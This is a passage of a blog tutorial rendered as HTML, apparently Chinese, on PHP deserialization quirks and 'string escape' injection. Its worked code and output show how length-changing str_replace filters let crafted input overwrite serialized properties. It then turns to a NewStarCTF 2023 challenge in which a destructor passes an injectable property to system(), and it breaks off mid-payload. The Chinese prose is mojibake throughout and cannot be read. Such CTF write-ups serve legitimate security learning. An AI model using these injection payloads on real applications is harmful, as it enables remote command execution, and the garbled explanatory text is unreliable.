class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line">æ­¤æ—¶ï¼Œå¦‚æœå˜æˆO:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;<span class="number">54656156135</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;54656156135&#x27;</span>));</span><br><span class="line">&#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">ä¸æ¯«æ²¡æœ‰å½±å“æ­£å¸¸çš„ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><h4 id="2ã€å½“åºåˆ—åŒ–çš„é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™"><a href="#2ã€å½“åºåˆ—åŒ–çš„é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™" class="headerlink" title="2ã€å½“åºåˆ—åŒ–çš„é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™"></a>2ã€å½“åºåˆ—åŒ–çš„é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;54656156135&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;<span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line">å¯ä»¥çœ‹åˆ°ï¼Œè¿”å›<span class="literal">false</span>ï¼Œå°±æ˜¯æ— æ³•æ­£å¸¸ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><h4 id="3ã€å¯ä»¥ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ "><a href="#3ã€å¯ä»¥ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ " class="headerlink" title="3ã€å¯ä»¥ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ "></a>3ã€å¯ä»¥ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ </h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;c&quot;;s:1:&quot;c&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;<span class="keyword">object</span>(s)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;c&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">çœ‹åˆ°ç±»é‡Œé¢å¹¶æ²¡æœ‰cï¼Œä½†æ˜¯èƒ½æ­£å¸¸ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><h3 id="PHPå­—ç¬¦ä¸²é€ƒé€¸"><a href="#PHPå­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="PHPå­—ç¬¦ä¸²é€ƒé€¸"></a>PHPå­—ç¬¦ä¸²é€ƒé€¸</h3><p>å­—ç¬¦ä¸²é€ƒé€¸ä¸€èˆ¬æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯å­—ç¬¦ä¸²å¢å¤šï¼Œä¸€ç§æ˜¯å­—ç¬¦ä¸²å‡å°‘</p><p>å­—ç¬¦ä¸²é€ƒé€¸çš„æœ¬è´¨ä¹Ÿæ˜¯å·®ä¸å¤šå°±æ˜¯é—­åˆï¼Œæœ‰ä¸€ç§æ³¨å…¥çš„æ„Ÿè§‰</p><h4 id="å¢å¤šçš„æƒ…å†µ"><a href="#å¢å¤šçš„æƒ…å†µ" class="headerlink" title="å¢å¤šçš„æƒ…å†µ"></a>å¢å¤šçš„æƒ…å†µ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;bad&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//echo waf(serialize($a));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;bad&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;è¿™æ˜¯æ²¡æœ‰ç»è¿‡æ›¿æ¢çš„</span></span><br><span class="line"><span class="comment">//O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;good&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;è¿™æ˜¯ç»è¿‡æ›¿æ¢æ‰çš„</span></span><br><span class="line">æ˜æ˜¾æ¯æ›¿æ¢ä¸€ä¸ªï¼Œå­—ç¬¦ä¸²é•¿åº¦å°±ä¼š+<span class="number">1</span>ï¼Œé‚£æˆ‘ä»¬ç°åœ¨ä¸åƒè®©bä¸º<span class="number">666</span>ï¼Œæƒ³è®©å®ƒæ˜¯<span class="number">888</span>ï¼Œä½†æ˜¯bæ˜¯ä¸å¯æ§çš„ï¼Œæ€ä¹ˆåŠï¼Œé‚£å°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸äº†ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é€ƒé€¸å­—ç¬¦ä¸²çš„é•¿åº¦<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span><span class="number">888</span><span class="string">&quot;;&#125;ï¼Œ21ä¸ªï¼Œé•¿åº¦ä¸º21.</span></span><br><span class="line"><span class="string">é‚£å°±æ˜¯21ä¸ªbadå°±èƒ½è®©&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;é€ƒé€¸ï¼Œå³</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">//for($i=0;$i&lt;21;$i++)&#123;</span></span><br><span class="line"><span class="comment">//  echo &#x27;bad&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">84</span>:<span class="string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;888&quot;</span>;&#125;<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span><span class="number">666</span><span class="string">&quot;;&#125;object(s)#2 (2) &#123;</span></span><br><span class="line"><span class="string">  [&quot;</span>a<span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  string(84) &quot;</span>goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood<span class="string">&quot;</span></span><br><span class="line"><span class="string">  [&quot;</span>b<span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  string(3) &quot;</span><span class="number">888</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">888666</span></span><br><span class="line"><span class="string">å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸæ›¿æ¢ã€‚</span></span><br></pre></td></tr></table></figure><h4 id="å‡å°‘çš„æƒ…å†µ"><a href="#å‡å°‘çš„æƒ…å†µ" class="headerlink" title="å‡å°‘çš„æƒ…å†µ"></a>å‡å°‘çš„æƒ…å†µ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;good&quot;</span>,<span class="string">&quot;hao&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿™ä¸ªæ˜¯æ¯æ›¿æ¢ä¸€ä¸ªå°±ä¼šå‡å°‘ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦è®©å‰é¢çš„åæ‰åé¢çš„ï¼Œå†é€šè¿‡ä¿®æ”¹$bæ¥å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œè®©å‰é¢åæ‰&quot;;s:1:&quot;b&quot;;s:21:ï¼Œæ¥å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œè¿™ä¸ªåŸç†ä¸å¢åŠ ç›¸ä¼¼ï¼Œåè¿‡æ¥å°±è¡Œã€‚</span></span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&#x27;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&#x27;</span>,<span class="string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//echo (waf(serialize($a)));</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">//for($i=0;$i&lt;17;$i++)&#123;</span></span><br><span class="line"><span class="comment">//  echo &#x27;good&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line"><span class="keyword">object</span>(s)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">64</span>) <span class="string">&quot;haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;888&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">888</span><span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span><span class="number">888</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">Process finished with exit code 0</span></span><br><span class="line"><span class="string">æˆåŠŸæ›¿æ¢ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><h3 id="å°è¯•ç‰›åˆ€â€”â€“-NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒï¼ˆå¢ï¼‰"><a href="#å°è¯•ç‰›åˆ€â€”â€“-NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒï¼ˆå¢ï¼‰" class="headerlink" title="å°è¯•ç‰›åˆ€â€”â€“[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒï¼ˆå¢ï¼‰"></a>å°è¯•ç‰›åˆ€â€”â€“[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒï¼ˆå¢ï¼‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);s</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])))); </span><br><span class="line"></span><br><span class="line">å¯ä»¥çœ‹åˆ°ï¼Œæ¯å°†ä¸€ä¸ªbadæ›¿æ¢æˆä¸€ä¸ªgoodï¼Œå­—ç¬¦ä¸²é•¿åº¦+<span class="number">1</span>ï¼Œkeyæ˜¯å¯æ§çš„</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;bad&quot;</span>;s:<span class="number">3</span>:<span 